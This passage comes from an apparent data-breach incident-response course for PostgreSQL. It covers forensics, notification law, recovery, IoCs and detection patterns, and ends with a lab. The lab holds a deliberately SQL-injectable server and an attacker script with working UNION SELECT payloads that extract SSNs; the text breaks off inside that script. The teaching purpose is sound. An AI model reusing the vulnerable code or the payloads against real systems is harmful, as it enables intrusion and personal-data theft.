TIMESTAMP=$(date -u +%Y%m%dT%H%M%SZ)
EVIDENCE_DIR="/forensics/incident_${TIMESTAMP}"
mkdir -p "${EVIDENCE_DIR}"

# 1. Capture volatile evidence FIRST
psql -c "SELECT * FROM pg_stat_activity;" > "${EVIDENCE_DIR}/active_sessions.txt"
ss -tuanp | grep :5432 > "${EVIDENCE_DIR}/network_connections.txt"
ps auxf > "${EVIDENCE_DIR}/process_tree.txt"
cat /proc/net/nf_conntrack > "${EVIDENCE_DIR}/conntrack.txt" 2>/dev/null

# 2. THEN apply containment
psql -c "ALTER USER suspect_user NOLOGIN;"
psql -c "SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE usename = 'suspect_user';"

# 3. Document the containment action
echo "[$TIMESTAMP] Disabled login for suspect_user, terminated active sessions" >> "${EVIDENCE_DIR}/containment_log.txt"

# 4. Hash everything
find "${EVIDENCE_DIR}" -type f -exec sha256sum {} \; > "${EVIDENCE_DIR}/hashes.sha256"
```

---

## 6. Regulatory Notification Requirements

### 6.1 GDPR (Articles 33 and 34)

#### Article 33 — Notification to Supervisory Authority

**Timeline:** Within 72 hours of becoming "aware" of a breach.

"Aware" means the controller has a reasonable degree of certainty that a breach has occurred. Initial detection of anomalies that require investigation does not start the clock — confirmed breach does.

**Content required (Article 33(3)):**
1. Nature of the breach (categories and approximate number of data subjects and records)
2. Name and contact details of the DPO
3. Likely consequences of the breach
4. Measures taken or proposed to address the breach

**Exception:** Notification not required if the breach is "unlikely to result in a risk to the rights and freedoms of natural persons" — e.g., encrypted data exfiltrated where the encryption key is not compromised.

**Template structure:**
```
PERSONAL DATA BREACH NOTIFICATION - [Supervisory Authority]
Date of notification: [YYYY-MM-DD]
Reference number: [Internal IR ticket]

1. CONTROLLER DETAILS
   Organization: [Name]
   DPO Contact: [Name, email, phone]

2. BREACH DESCRIPTION
   Date/time of breach: [YYYY-MM-DD HH:MM UTC]
   Date/time of discovery: [YYYY-MM-DD HH:MM UTC]
   Nature: [Unauthorized access / disclosure / loss / alteration / destruction]
   Categories of data: [Financial, health, identification, etc.]
   Approximate records affected: [Number]
   Approximate data subjects affected: [Number]
   Categories of data subjects: [Customers, employees, patients, etc.]

3. LIKELY CONSEQUENCES
   [Identity theft risk / Financial fraud risk / Discrimination / etc.]

4. MEASURES TAKEN
   Containment: [Actions taken]
   Mitigation: [Measures to reduce harm]
   Prevention: [Long-term improvements planned]

5. CROSS-BORDER IMPACT
   [List of EU/EEA countries where affected data subjects reside]
```

#### Article 34 — Communication to Data Subjects

Required when breach is "likely to result in a high risk to the rights and freedoms of natural persons."

**Exceptions to individual notification:**
- Controller has applied appropriate technical protection (encryption) rendering data unintelligible
- Controller has taken subsequent measures ensuring high risk is no longer likely
- It would involve disproportionate effort (use public communication instead)

### 6.2 HIPAA Breach Notification Rule

**45 CFR 164.404-408**

| Breach Size | Notification Requirement | Timeline |
|-------------|------------------------|----------|
| 500+ individuals (single state/jurisdiction) | Individual notification + HHS + media | Without unreasonable delay, no later than 60 days from discovery |
| 500+ individuals (multiple states) | Individual notification + HHS | Without unreasonable delay, no later than 60 days |
| <500 individuals | Individual notification + HHS (annual log) | 60 days for individuals; annual submission to HHS |

**Discovery date:** The first day the breach is known or should reasonably have been known (not the date of the breach itself).

**Safe Harbor:** Breach notification not required if PHI was encrypted per NIST standards AND the encryption key was not compromised.

**Content of individual notification:**
1. Description of the breach (what happened, dates)
2. Types of information involved
3. Steps individuals should take to protect themselves
4. What the entity is doing in response
5. Contact information for questions

**HHS Reporting:** Via https://ocrportal.hhs.gov/ocr/breach/wizard_breach.jsf

### 6.3 PCI-DSS Incident Response

**Requirement 12.10:** Implement an incident response plan.

When cardholder data is compromised:

1. **Immediately notify the payment brand(s)** (Visa, Mastercard, AMEX, Discover)
2. **Engage a PCI Forensic Investigator (PFI)** — The acquiring bank mandates this; only QSA-certified PFIs can conduct the investigation
3. **Preserve evidence** for the PFI (do not remediate before forensic imaging)
4. **Provide Compromised Account Management Indicators (CAMS)** — List of compromised card numbers to brands for monitoring
5. **Complete Incident Response Report** per payment brand requirements

**Visa CAMS reporting:**
- Within 3 business days of confirmed compromise
- Provide all potentially compromised Primary Account Numbers (PANs)
- Format: CSV with PAN, expiry date, service code where available

**Mastercard ADCR (Account Data Compromise Recovery):**
- Notification within 24 hours of confirmed breach
- Full forensic investigation report within 5 business days

### 6.4 US State Breach Notification Laws

All 50 US states plus DC, Guam, Puerto Rico, and the US Virgin Islands have breach notification laws. Key variations:

| State | Trigger | Timeline | Private Right of Action | AG Notification Threshold |
|-------|---------|----------|------------------------|--------------------------|
| **California** (CCPA/CPRA) | Unencrypted personal info OR credentials | "Most expedient time possible" without unreasonable delay | Yes (statutory damages $100-750/consumer) | 500+ residents |
| **New York** (SHIELD Act) | Private info + NY residents | "Most expedient time possible" | No (AG enforcement only) | Any NY resident affected |
| **Texas** | Sensitive personal info | 60 days from determination | No (AG enforcement) | 250+ residents → AG notification |
| **Florida** | Personal info + FL residents | 30 days (one of the shortest) | No | 500+ residents |
| **Illinois** (BIPA for biometric) | Biometric data breach | "Most expedient time possible" | Yes (BIPA has strong private right) | AG notification required |
| **Massachusetts** | Personal info + MA residents | "As soon as practicable" | Yes | AG + Office of Consumer Affairs |
| **Colorado** | Personal info | 30 days | No | 500+ residents → AG notification |
| **Virginia** (VCDPA) | Personal info | 60 days | No (AG enforcement) | AG + affected individuals |

**Common elements across all states:**
- "Personal information" typically = name + SSN, driver's license, financial account number, or medical info
- Most require notification to state Attorney General above certain thresholds
- Encryption is a safe harbor in most (but not all) states

### 6.5 International Frameworks

| Jurisdiction | Law | Timeline | Authority |
|-------------|-----|----------|-----------|
| **EU/EEA** | GDPR | 72 hours to DPA | National Data Protection Authority |
| **UK** | UK GDPR + DPA 2018 | 72 hours | ICO (Information Commissioner's Office) |
| **Canada** | PIPEDA | "As soon as feasible" | OPC (Office of Privacy Commissioner) |
| **Australia** | Notifiable Data Breaches scheme (Privacy Act) | 30 days (assessment) + "as soon as practicable" | OAIC |
| **Brazil** | LGPD | "Reasonable time" (guidance says 2 business days) | ANPD |
| **Japan** | APPI | 3-5 days (preliminary); 30 days (full) | PPC |
| **South Korea** | PIPA | 72 hours | PIPC |
| **India** | DPDPA 2023 | "Without delay" | DPB (Data Protection Board) |
| **Singapore** | PDPA | 3 calendar days (to PDPC) | PDPC |

---

## 7. Communication and Stakeholder Management

### 7.1 Internal Escalation Matrix

```
Severity: CRITICAL (P1)
├── 0-15 min:  Security team on-call → IR activation
├── 15-30 min: CISO, CTO, VP Engineering
├── 30-60 min: CEO, General Counsel, Board (if publicly traded)
├── 1-4 hrs:   Full IR team assembled, legal engaged
└── 4-24 hrs:  Board formal notification (if material breach)

Severity: HIGH (P2)  
├── 0-30 min:  Security team lead → IR activation
├── 30-60 min: CISO, Director of Engineering
├── 1-4 hrs:   VP Legal, Head of Compliance
└── 4-24 hrs:  Executive team briefing

Severity: MEDIUM (P3)
├── 0-1 hr:    Security team assignment
├── 1-4 hrs:   Security team lead informed
├── 4-24 hrs:  Engineering manager notified
└── 24-72 hrs: Summary report to CISO

Severity: LOW (P4)
├── 0-4 hrs:   Security team ticket created
├── 1-5 days:  Investigation completed
└── Weekly:    Included in security metrics report
```

### 7.2 Legal Counsel Involvement Triggers

Engage legal counsel (internal privacy counsel AND external breach counsel) when:

- Personal data of 500+ individuals is confirmed or suspected to be compromised
- Any breach of health data (PHI), financial data (PCI), or authentication credentials
- Attacker claims responsibility or makes demands (ransomware)
- Law enforcement involvement is needed or already initiated
- Media inquiry received about a potential breach
- Third-party vendor responsible for data requests involvement
- Any breach potentially triggering contractual notification obligations to partners/customers
- Regulatory investigation or inquiry begins

**Privilege considerations:**
- Engage external counsel early to establish attorney-client privilege over forensic investigation
- Forensic investigators hired by counsel (not by IT) can have their findings protected by work-product doctrine
- Internal communications about the breach should be marked "ATTORNEY-CLIENT PRIVILEGED" when appropriate
- Do not over-claim privilege — routine business communications about remediation are not privileged

### 7.3 Customer Notification

#### Timing

- After legal review and regulatory notification (or simultaneously)
- Before public disclosure / media coverage when possible
- Balance thoroughness with speed — incomplete but early notification is better than late notification

#### Content Template

```
Subject: Important Security Notice — Action May Be Required

Dear [Customer Name],

We are writing to inform you of a security incident that may affect your personal 
information.

WHAT HAPPENED
On [date], we identified unauthorized access to [system/database]. Our investigation 
determined that [specific data elements] associated with your account may have been 
accessed between [date range].

WHAT INFORMATION WAS INVOLVED
The information that may have been accessed includes: [specific list — name, email, 
address, financial details, etc.]

The following information was NOT affected: [specify what was NOT compromised to 
reduce anxiety]

WHAT WE ARE DOING
- [Specific containment actions taken]
- [Security improvements implemented]
- [Monitoring services being provided]
- [Third-party forensic investigation engaged]

WHAT YOU CAN DO
- [Specific recommended actions]
- [Password change instructions if applicable]
- [Credit monitoring enrollment link if applicable]
- [Fraud alert placement instructions]

FOR MORE INFORMATION
- Dedicated incident hotline: [phone number]
- FAQ page: [URL]
- Contact email: [address]

We sincerely regret this incident and remain committed to protecting your information.

[Signature]
```

#### Channels

- **Email** — Primary channel for individual notification (verify email addresses are current)
- **Postal mail** — Required in some jurisdictions; used when email is not available or for high-sensitivity situations
- **Website notice** — Supplement (not replacement) for situations affecting all users
- **In-app notification** — For active users who may not check email
- **Dedicated incident page** — Host FAQ, updates, and self-service tools

### 7.4 Media Handling

- **Prepare holding statement** before media inquiries arrive
- **Single spokesperson** — All media requests route through communications lead
- **Stick to confirmed facts** — Never speculate on attacker identity, motivation, or full scope before investigation completes
- **Coordinate with regulators** — Ensure public statements align with regulatory notifications
- **Monitor social media** — Detect and respond to misinformation about the breach

### 7.5 Law Enforcement Involvement

#### When to Engage

- Sophisticated/targeted attack (APT indicators)
- Ransomware demand received
- Insider threat with criminal conduct
- Data found for sale on criminal marketplaces
- Attack attributed to known threat actors
- Critical infrastructure impact

#### Agencies

| Jurisdiction | Agency | Contact Method |
|-------------|--------|----------------|
| **US** | FBI Cyber Division (IC3.gov) | Internet Crime Complaint Center |
| **US** | US Secret Service (if financial) | Local field office |
| **EU** | Europol EC3 (European Cybercrime Centre) | Through national law enforcement |
| **UK** | NCA (National Crime Agency) + NCSC | NCSC incident reporting |
| **Australia** | AFP + ACSC | cyber.gov.au |
| **International** | INTERPOL | Through national central bureau |

#### Considerations

- Law enforcement may request delayed notification to avoid tipping off attackers
- Document any law enforcement requests to delay notification (this can serve as justification for extended notification timelines under GDPR)
- Share indicators of compromise (IoCs) with law enforcement and relevant ISACs
- Maintain chain of custody for any evidence that may be used in prosecution

### 7.6 Credit Monitoring Provision

Standard practice for breaches involving:
- Social Security Numbers / National ID numbers
- Financial account information
- Dates of birth combined with other PII

Typical offering:
- 12-24 months of credit monitoring service
- Identity theft insurance ($1M typical)
- Dark web monitoring for affected credentials
- Dedicated fraud resolution specialist

Vendors: Experian IdentityWorks, Equifax Complete, TransUnion, Kroll, IDX.

---

## 8. Recovery and Remediation

### 8.1 Data Integrity Verification

After a breach, you cannot trust the database contents at face value. The attacker may have modified data.

#### Checksum Verification

```sql
-- PostgreSQL: Generate table checksums for comparison with known-good backup
SELECT md5(string_agg(t::text, '')) 
FROM (SELECT * FROM customers ORDER BY id) t;

-- More efficient: Use pg_checksums for page-level integrity
-- (Requires cluster shutdown or PostgreSQL 12+ for online verification)
-- pg_checksums --check -D /var/lib/postgresql/data

-- Row count reconciliation
SELECT schemaname, relname, n_live_tup 
FROM pg_stat_user_tables 
ORDER BY schemaname, relname;
-- Compare against known-good counts from before breach window
```

#### Reconciliation Process

```
1. Identify last known-good point (pre-breach)
2. Restore backup to separate instance
3. Compare:
   ├── Row counts per table
   ├── Schema changes (new tables, columns, functions, triggers)
   ├── Data modifications (diff specific tables)
   ├── Permission changes (role memberships, grants)
   └── Configuration changes (postgresql.conf, pg_hba.conf)
4. Document all discrepancies
5. Classify: attacker-caused vs legitimate business changes during period
```

```sql
-- PostgreSQL: Compare two databases for schema differences
-- On forensic/comparison instance:
pg_dump --schema-only production_current > /tmp/schema_current.sql
pg_dump --schema-only production_backup > /tmp/schema_backup.sql
diff /tmp/schema_current.sql /tmp/schema_backup.sql

-- Compare specific table data
-- Using pg_dump with --data-only --table=target_table for both instances
-- Then diff the outputs, or use dedicated tools like pgdiff
```

### 8.2 Backup Restoration with Breach Timeline Consideration

Critical question: **When did the breach begin?** Restoring from a backup taken after breach commencement restores compromised data.

```
Timeline:
─────────────────────────────────────────────────────────────
  [Backup A]     [Breach Start]    [Backup B]    [Discovery]
  2024-01-10     2024-01-12        2024-01-14    2024-01-16
─────────────────────────────────────────────────────────────

Backup A = Clean (pre-breach) — Safe to restore from
Backup B = Potentially compromised — May contain attacker persistence
```

```bash
# PostgreSQL: Point-in-time recovery to just before breach
# recovery.conf / postgresql.conf (PG12+)
restore_command = 'cp /mnt/wal_archive/%f %p'
recovery_target_time = '2024-01-12 00:00:00 UTC'
recovery_target_action = 'promote'

# After PITR, reconcile legitimate transactions that occurred 
# between backup point and breach start with current production
```

### 8.3 Credential Mass Rotation

Post-breach credential rotation must be comprehensive and atomic (no partial rotations that create auth failures):

```bash
# Rotation checklist
CREDENTIAL_ROTATION_LIST:
├── Database superuser passwords
├── Application service account passwords
├── Replication user credentials
├── Monitoring user credentials
├── Backup user credentials
├── Connection pooler (PgBouncer/ProxySQL) auth
├── Application connection strings (all environments)
├── API keys that authenticate to database-backed services
├── SSL/TLS certificates (if private key exposure suspected)
├── Encryption keys (tablespace encryption, column-level encryption)
├── Cloud IAM credentials (RDS master password, IAM auth tokens)
└── Third-party integration credentials stored in database

# Rotation execution order:
# 1. Generate all new credentials (secrets manager)
# 2. Update database authentication (new passwords)
# 3. Update application configuration (point to new creds)
# 4. Rolling restart applications
# 5. Verify all connections authenticate successfully
# 6. Revoke old credentials
# 7. Monitor for failed authentication (indicates missed rotation)
```

### 8.4 Patching and Hardening

Post-breach hardening addresses both the exploited vulnerability and the broader attack surface:

```sql
-- PostgreSQL hardening post-breach

-- 1. Restrict pg_hba.conf to minimum necessary
-- Remove any 'trust' entries
-- Enforce scram-sha-256 (not md5)
-- host production app_user 10.0.1.0/24 scram-sha-256
-- host replication repl_user 10.0.2.0/24 scram-sha-256
-- host all all 0.0.0.0/0 reject

-- 2. Enforce SSL
ALTER SYSTEM SET ssl = on;
ALTER SYSTEM SET ssl_min_protocol_version = 'TLSv1.3';

-- 3. Restrict superuser access
ALTER SYSTEM SET log_connections = on;
ALTER SYSTEM SET log_disconnections = on;

-- 4. Limit query capabilities
ALTER USER app_user SET statement_timeout = '30s';
ALTER USER app_user SET lock_timeout = '10s';
-- Prevent INTO OUTFILE equivalent
REVOKE ALL ON FUNCTION pg_read_file(text) FROM PUBLIC;
REVOKE ALL ON FUNCTION pg_read_binary_file(text) FROM PUBLIC;

-- 5. Enable row-level security on sensitive tables
ALTER TABLE customers ENABLE ROW LEVEL SECURITY;
CREATE POLICY customer_access ON customers
  USING (tenant_id = current_setting('app.tenant_id')::int);

-- 6. Remove unnecessary extensions
DROP EXTENSION IF EXISTS dblink;
DROP EXTENSION IF EXISTS postgres_fdw;
-- (only if not legitimately used)
```

### 8.5 Monitoring Enhancement

Deploy improved detection capabilities addressing the specific attack vectors used:

- **Query anomaly detection** — Deploy rules specific to the exfiltration patterns observed
- **Baseline recalibration** — After breach remediation, establish new baselines for legitimate activity
- **Privileged session monitoring** — All DBA sessions recorded and reviewed
- **Data access auditing** — Granular audit logging on all tables containing sensitive data
- **Egress monitoring** — Network DLP on database segment with alerts on bulk data leaving
- **File integrity monitoring** — Alert on changes to database configuration, binaries, and shared libraries

### 8.6 Access Review

```
Post-breach access review scope:
├── Remove all accounts not traceable to an active employee/service
├── Validate principle of least privilege for all remaining accounts
├── Review and reduce GRANT hierarchy
├── Audit database role memberships
├── Review stored procedures running as SECURITY DEFINER
├── Check for hardcoded credentials in application code
├── Verify connection pooler configuration (auth pass-through)
├── Audit scheduled jobs and their credential requirements
└── Review cross-database links and federated access
```

---

## 9. Post-Incident Analysis

### 9.1 Root Cause Analysis

#### 5 Whys Method Applied to Data Breach

```
Incident: Customer PII exfiltrated via SQL injection

Why 1: Why was data exfiltrated?
→ Attacker executed UNION SELECT queries via the search endpoint

Why 2: Why did the search endpoint allow UNION SELECT?
→ The search query used string concatenation instead of parameterized queries

Why 3: Why was string concatenation used?
→ Legacy code from 2018 migration was never updated to use the ORM

Why 4: Why wasn't the legacy code updated?
→ No secure code review process for legacy systems; only new code is reviewed

Why 5: Why is there no review process for legacy code?
→ Security team was understaffed and prioritized new feature reviews only

Root Cause: Insufficient security engineering capacity to address technical debt
Contributing Factor: No automated SAST scanning in CI/CD pipeline that would catch SQLi patterns
```

#### Fishbone Diagram Categories for Data Breach

```
                              DATA BREACH
                                  │
    ┌─────────────┬───────────────┼───────────────┬──────────────┐
    │             │               │               │              │
 PEOPLE      PROCESS         TECHNOLOGY       ENVIRONMENT    DATA
    │             │               │               │              │
 ├─Training   ├─No code       ├─Unpatched     ├─Cloud       ├─No classification
 ├─Awareness    review          database        misconfig    ├─Over-retention
 ├─Insider   ├─No pen test   ├─No WAF        ├─Vendor      ├─No encryption
 ├─Staffing  ├─No monitoring ├─No DLP          access      ├─Broad access
 └─Social    ├─Weak IAM     ├─Legacy code   ├─Regulatory  └─No masking
   engineer  └─No IR plan   └─No MFA          change
```

### 9.2 Attack Timeline Documentation

The final timeline is the authoritative record of the incident. It should be:
- **Chronological** — UTC timestamps, to the second where possible
- **Multi-source** — Corroborated across log sources
- **Complete** — From initial access through detection through remediation
- **Attributed** — Each action attributed to specific actor/account

```
INCIDENT TIMELINE — IR-2024-0042

Phase: Initial Access
├── 2024-01-12T14:22:18Z — First SQLi probe from 198.51.100.42 (WAF log)
├── 2024-01-12T14:22:19Z — WAF in detection-only mode, request passed through
├── 2024-01-12T14:23:05Z — Successful SQL injection: UNION SELECT on /api/search
└── 2024-01-12T14:23:06Z — Application returned 200 with database error in response body

Phase: Reconnaissance
├── 2024-01-12T14:25:33Z — Query: SELECT table_name FROM information_schema.tables
├── 2024-01-12T14:26:01Z — Query: SELECT column_name FROM information_schema.columns WHERE table_name='users'
├── 2024-01-12T14:27:15Z — Query: SELECT column_name FROM information_schema.columns WHERE table_name='payments'
└── 2024-01-12T14:28:44Z — Query: SELECT COUNT(*) FROM users → returned 847,293

Phase: Exfiltration
├── 2024-01-12T14:30:00Z — Begin: SELECT id,email,name,ssn FROM users LIMIT 1000 OFFSET 0
├── 2024-01-12T14:30:02Z — ... OFFSET 1000
├── [...]
├── 2024-01-13T03:44:18Z — Last observed: OFFSET 847000
└── 2024-01-13T03:44:19Z — Total egress estimated: 2.1 GB over 13.2 hours

Phase: Detection
├── 2024-01-15T09:14:00Z — SOC analyst notices anomalous query volume in daily report
├── 2024-01-15T09:45:00Z — SOC escalates to security team
├── 2024-01-15T10:30:00Z — Security team confirms data breach
└── 2024-01-15T10:31:00Z — IR process activated (IC assigned)

Phase: Containment
├── 2024-01-15T10:35:00Z — Attacker IP blocked at WAF and firewall
├── 2024-01-15T10:40:00Z — Application credential rotated
├── 2024-01-15T10:42:00Z — Vulnerable endpoint taken offline
└── 2024-01-15T11:00:00Z — Full query audit logging enabled

Phase: Recovery
├── 2024-01-15T14:00:00Z — Patched SQLi vulnerability deployed
├── 2024-01-15T16:00:00Z — WAF rule updated to blocking mode
├── 2024-01-16T09:00:00Z — All database credentials rotated
└── 2024-01-17T10:00:00Z — Endpoint restored with parameterized queries
```

### 9.3 Indicators of Compromise (IoC) Extraction

Document IoCs for sharing (STIX/TAXII format) and internal detection:

```yaml
indicators_of_compromise:
  network:
    - type: ipv4
      value: 198.51.100.42
      context: "SQL injection source IP"
      first_seen: "2024-01-12T14:22:18Z"
      last_seen: "2024-01-13T03:44:19Z"
    - type: ipv4
      value: 203.0.113.77
      context: "C2 callback destination"
      first_seen: "2024-01-12T15:00:00Z"
    
  behavioral:
    - type: query_pattern
      value: "UNION SELECT.*FROM information_schema"
      context: "Schema reconnaissance pattern"
    - type: query_pattern  
      value: "SELECT.*FROM users.*LIMIT 1000 OFFSET"
      context: "Paginated bulk exfiltration pattern"
    - type: timing
      value: "Database queries between 02:00-05:00 UTC from app_user"
      context: "Off-hours exfiltration window"

  host:
    - type: file_hash_sha256
      value: "a1b2c3d4e5f6..."
      context: "Web shell found on application server"
      path: "/var/www/app/public/.thumb_cache.php"
    
  database:
    - type: user_account
      value: "maintenance_temp_user"
      context: "Attacker-created database account"
    - type: stored_procedure
      value: "sp_system_diag"
      context: "Attacker-created backdoor procedure"
```

### 9.4 MITRE ATT&CK Mapping for Data Breach Tactics

Map observed attacker techniques to MITRE ATT&CK framework:

| Phase | Technique ID | Technique Name | Evidence |
|-------|-------------|----------------|----------|
| Initial Access | T1190 | Exploit Public-Facing Application | SQL injection on /api/search |
| Execution | T1059.004 | Unix Shell | Commands via SQLi xp_cmdshell equivalent |
| Persistence | T1136.001 | Create Account: Local Account | maintenance_temp_user created |
| Privilege Escalation | T1078.001 | Valid Accounts: Default Accounts | Leveraged app_user service account |
| Defense Evasion | T1070.003 | Clear Command History | pg_stat_statements reset attempted |
| Discovery | T1046 | Network Service Discovery | information_schema enumeration |
| Collection | T1530 | Data from Cloud Storage | N/A (not observed) |
| Collection | T1005 | Data from Local System | Targeted users, payments tables |
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol | Data in HTTP responses via SQLi |
| Impact | T1485 | Data Destruction | N/A (exfiltration only, no destruction) |

### 9.5 Lessons Learned Template

```
LESSONS LEARNED REPORT — IR-2024-0042
Date: 2024-02-01
Participants: [IR team, management, affected teams]
Facilitator: [Name]

1. INCIDENT SUMMARY
   [2-paragraph executive summary]

2. TIMELINE SUMMARY
   Detection time (dwell time): 2 days, 19 hours
   Containment time: 31 minutes from IR activation
   Recovery time: 2 days
   Total business impact duration: 4 days

3. WHAT WORKED WELL
   - Network monitoring detected anomalous egress
   - Credential rotation executed within SLA
   - Legal team engaged promptly
   - Customer notification executed within 72 hours

4. WHAT FAILED OR WAS INADEQUATE
   - WAF was in detection-only mode (should have been blocking)
   - No automated alert on bulk query patterns
   - Legacy code not covered by SAST scanning
   - Detection took 2+ days (should be <1 hour)
   - No canary tokens in sensitive tables

5. ROOT CAUSE
   SQL injection in legacy endpoint using string concatenation

6. CONTRIBUTING FACTORS
   - Technical debt backlog not prioritized for security items
   - WAF deployment incomplete (detection-only vs blocking)
   - No database activity monitoring solution deployed
   - Insufficient query-level alerting

7. RECOMMENDATIONS
   | # | Action | Owner | Deadline | Priority |
   |---|--------|-------|----------|----------|
   | 1 | Deploy SAST in CI/CD for all repos | AppSec | 2024-02-28 | CRITICAL |
   | 2 | Switch WAF to blocking mode | SecOps | 2024-02-07 | CRITICAL |
   | 3 | Implement DB canary tokens | DBA team | 2024-03-15 | HIGH |
   | 4 | Deploy DAM solution | Security | 2024-04-30 | HIGH |
   | 5 | Remediate all legacy SQLi | Engineering | 2024-03-31 | CRITICAL |
   | 6 | Query volume alerting | SOC | 2024-02-14 | HIGH |
   | 7 | Reduce detection time to <1hr | SOC/SIEM | 2024-03-30 | HIGH |

8. METRICS UPDATE
   - Mean Time to Detect (MTTD): 67 hours → Target: 1 hour
   - Mean Time to Contain (MTTC): 31 minutes (within SLA)
   - Mean Time to Recover (MTTR): 48 hours → Target: 24 hours

9. PLAYBOOK UPDATES
   - Updated SQLi playbook with bulk exfiltration indicators
   - Added UNION SELECT pattern to SIEM detection rules
   - Created new playbook: "Paginated data exfiltration via application layer"

10. NEXT REVIEW
    Follow-up meeting: 2024-03-01 to verify recommendation implementation
```

### 9.6 Security Improvement Plan

Structure post-incident improvements into 30/60/90 day horizons:

**30 Days (Immediate):**
- Patch the specific vulnerability exploited
- Deploy blocking rules for the observed attack pattern
- Complete credential rotation
- Enable comprehensive audit logging
- Implement canary tokens in high-value tables

**60 Days (Short-term):**
- Deploy automated SAST/DAST in CI/CD
- Implement database activity monitoring
- Complete legacy code security review
- Deploy network-level data exfiltration detection
- Conduct security awareness training focused on SQL injection

**90 Days (Medium-term):**
- Deploy row-level security on all PII tables
- Implement data masking for non-production environments
- Complete third-party penetration test
- Implement privileged access management for database access
- Achieve compliance with updated standards (if applicable)

---

## 10. Lab Exercises

### Lab 1: SQL Injection Data Breach — Full IR Process

**Objective:** Simulate a SQL injection attack leading to data exfiltration, then execute the complete incident response process.

#### Environment Setup

```bash
# Docker-compose for lab environment
cat << 'LABEOF'
version: '3.8'

services:
  vulnerable-app:
    image: python:3.11-slim
    volumes:
      - ./app:/app
    ports:
      - "8080:8080"
    environment:
      - DATABASE_URL=postgresql://app_user:AppPass123@postgres:5432/labdb
    command: python /app/vulnerable_server.py
    depends_on:
      - postgres
      
  postgres:
    image: postgres:16
    environment:
      POSTGRES_DB: labdb
      POSTGRES_USER: admin
      POSTGRES_PASSWORD: AdminPass456
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
      - ./postgresql.conf:/etc/postgresql/postgresql.conf
      - pgdata:/var/lib/postgresql/data
      - ./logs:/var/log/postgresql
    ports:
      - "5432:5432"
    command: postgres -c config_file=/etc/postgresql/postgresql.conf
    
  siem:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
    ports:
      - "9200:9200"

  attacker:
    image: python:3.11-slim
    volumes:
      - ./attacker:/attacker
    command: sleep infinity

volumes:
  pgdata:
LABEOF

# Database initialization script
cat << 'INITEOF'
-- Create application user with limited privileges
CREATE USER app_user WITH PASSWORD 'AppPass123';
GRANT CONNECT ON DATABASE labdb TO app_user;

-- Create schema
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    email VARCHAR(255) NOT NULL,
    full_name VARCHAR(255),
    ssn VARCHAR(11),
    date_of_birth DATE,
    password_hash VARCHAR(255),
    created_at TIMESTAMP DEFAULT NOW()
);

CREATE TABLE payments (
    id SERIAL PRIMARY KEY,
    user_id INTEGER REFERENCES users(id),
    card_number VARCHAR(19),
    card_expiry VARCHAR(7),
    amount DECIMAL(10,2),
    transaction_date TIMESTAMP DEFAULT NOW()
);

-- Populate with synthetic data (1000 records)
INSERT INTO users (email, full_name, ssn, date_of_birth, password_hash)
SELECT 
    'user' || n || '@example.com',
    'Test User ' || n,
    LPAD((100000000 + n)::text, 9, '0'),
    '1980-01-01'::date + (n || ' days')::interval,
    md5(random()::text)
FROM generate_series(1, 1000) n;

INSERT INTO payments (user_id, card_number, card_expiry, amount)
SELECT 
    (random() * 999 + 1)::int,
    '4' || LPAD((random() * 999999999999999)::bigint::text, 15, '0'),
    '20' || (24 + (random()*5)::int)::text || '/' || LPAD((random()*11+1)::int::text, 2, '0'),
    (random() * 9999)::numeric(10,2)
FROM generate_series(1, 5000);

-- Grant minimal privileges
GRANT SELECT ON users, payments TO app_user;

-- Install audit logging
CREATE EXTENSION IF NOT EXISTS pgaudit;

-- Create canary record
INSERT INTO users (email, full_name, ssn, date_of_birth, password_hash)
VALUES ('canary.trap@internal-monitor.example.com', 'System Monitor Account', 
        '000-00-0000', '1900-01-01', 'CANARY_DO_NOT_QUERY');
INITEOF
```

#### Vulnerable Application (The Target)

```python
# vulnerable_server.py — Intentionally vulnerable for lab use
# DO NOT deploy in any non-lab environment
from http.server import HTTPServer, BaseHTTPRequestHandler
import psycopg2
import json
import os
from urllib.parse import urlparse, parse_qs

DATABASE_URL = os.environ['DATABASE_URL']

class VulnerableHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        if parsed.path == '/api/search':
            query_term = params.get('q', [''])[0]
            # VULNERABLE: String concatenation — SQL injection possible
            sql = f"SELECT id, email, full_name FROM users WHERE full_name LIKE '%{query_term}%'"
            
            conn = psycopg2.connect(DATABASE_URL)
            cur = conn.cursor()
            try:
                cur.execute(sql)
                results = cur.fetchall()
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(results).encode())
            except Exception as e:
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                # VULNERABLE: Error message leaks database information
                self.wfile.write(json.dumps({'error': str(e)}).encode())
            finally:
                cur.close()
                conn.close()
        else:
            self.send_response(404)
            self.end_headers()

HTTPServer(('0.0.0.0', 8080), VulnerableHandler).serve_forever()
```

#### Attack Simulation Script

```python
# attacker/exfiltrate.py — Simulates attacker behavior
import requests
import time
import json

TARGET = "http://vulnerable-app:8080"

def phase1_reconnaissance():
    """Identify SQL injection point and enumerate schema"""
    print("[*] Phase 1: Reconnaissance")
    
    # Test for SQL injection
    test_payload = "' OR '1'='1"
    r = requests.get(f"{TARGET}/api/search", params={'q': test_payload})
    if r.status_code == 200 and len(r.json()) > 10:
        print("[+] SQL injection confirmed on /api/search")
    
    # Enumerate tables
    payload = "' UNION SELECT table_name::text, NULL, NULL FROM information_schema.tables WHERE table_schema='public'--"
    r = requests.get(f"{TARGET}/api/search", params={'q': payload})
    tables = [row[0] for row in r.json()]
    print(f"[+] Tables found: {tables}")
    
    # Enumerate columns for each table
    for table in tables:
        payload = f"' UNION SELECT column_name::text, data_type::text, NULL FROM information_schema.columns WHERE table_name='{table}'--"
        r = requests.get(f"{TARGET}/api/search", params={'q': payload})
        print(f"[+] Columns in {table}: {r.json()}")
    
    return tables

def phase2_exfiltration():
    """Extract sensitive data in batches"""
    print("[*] Phase 2: Data Exfiltration")
    
    offset = 0
    batch_size = 100
    all_data = []
    
    while True:
        payload = f"' UNION SELECT email, ssn, full_name FROM users ORDER BY id LIMIT {batch_size} OFFSET {offset}--"
        r = requests.get(f"{TARGET}/api/search", params={'q': payload})
        batch = r.json()
        
        if not batch:
